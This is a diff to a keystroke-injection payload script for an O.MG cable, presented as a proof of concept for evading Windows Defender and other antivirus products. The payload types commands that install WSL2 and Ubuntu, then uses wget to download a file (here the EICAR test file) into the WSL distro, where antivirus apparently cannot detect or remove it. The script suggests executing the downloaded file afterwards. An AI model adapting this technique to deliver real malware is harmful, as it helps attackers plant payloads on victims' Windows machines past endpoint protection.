@@ -3,7 +3,7 @@ REM Author: mylorik
 REM Description: 
 REM This payload is a POC of downloading a malicious file, like EICAR, while avoiding Windows Defender and 3rd party antivirus solutions without any tampering!
 REM This is done by downloading the file to the WSL2 distro
-REM Target: Windows 11
+REM Target: Windows 11 (Windows 10 1903+)
 REM System: OMG, firmware 3
 REM Details:
 REM While the antivirus cannot detect the downloaded file, it may be detected during Execution of that bad file, but even then it cannot remove the file from WSL2 distro!
@@ -37,12 +37,12 @@ REM Install WSL2
 STRINGLN wsl --install
 STRINGLN wsl --install Ubuntu
 
-REM We wait for the above two comanads to finish, at the end of "wsl --install Ubuntu" it will ask you create username and password for Ubuntu, we don't have to provide it
+REM We wait for the above two comanads to finish, at the end of "wsl --install Ubuntu" it will ask you to create username:password for Ubuntu, we don't have to provide it
 DELAY 55000
 CTRL c
 
 REM in Windows 10 the path may look different 
-REM download out malicious file to the WSL2 distro
+REM download malicious file to the WSL2 distro
 STRINGLN wget https://secure.eicar.org/eicar.com.txt -O Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\eicar.com.txt
 
 REM at this point you may execute the file downloaded above
